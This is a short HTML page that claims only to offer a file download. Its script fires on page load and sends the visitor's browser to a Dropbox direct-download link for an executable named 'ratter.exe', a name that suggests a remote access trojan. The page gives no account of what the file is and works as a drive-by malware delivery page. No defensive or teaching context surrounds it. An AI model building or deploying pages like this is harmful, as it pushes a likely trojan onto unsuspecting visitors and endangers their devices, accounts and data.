<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download File from Dropbox</title>
    <script>
        // Automatically trigger the download when the page loads
        window.onload = function() {
            const dropboxUrl = "https://www.dropbox.com/scl/fi/3tq34653y38bnccjltptc/ratter.exe?rlkey=hsnklrpmd19ycsnhbh0nuakym&st=tsykf214&dl=1";
            window.location.href = dropboxUrl; // Redirect to the direct download link
        };
    </script>
</head>
<body>
    <h1>Redirecting you to download your file...</h1>
</body>
</html>
